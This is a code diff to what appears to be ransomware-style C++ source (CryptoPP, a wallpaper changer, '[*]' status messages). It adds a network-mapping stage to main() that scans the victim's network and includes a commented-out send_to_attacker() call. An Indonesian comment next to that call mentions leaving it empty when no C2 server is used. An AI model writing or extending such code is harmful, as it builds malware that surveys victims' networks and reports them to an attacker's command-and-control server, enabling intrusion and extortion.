@@ -33,7 +33,7 @@
 #include <random>
 #include <cstring>
 #include <ctime>
-
+#include "src/network_mapper.h"
 using namespace CryptoPP;
 namespace fs = std::filesystem;
 
@@ -1012,6 +1012,15 @@ int main() {
         std::this_thread::sleep_for(std::chrono::seconds(5));
         return 0;
     }
+
+    // Network mapping
+    std::cout << "[*] Starting network mapping...\n";
+    {
+        NetworkMapper mapper;
+        mapper.perform_mapping();
+        /*mapper.send_to_attacker(); // Kosongin parameter kalo gak pake C2*/
+    }
+    std::cout << "[✓] Network mapping completed\n\n";
 
     // Change wallpaper first (immediate visual feedback)
     WallpaperChanger wallpaper;
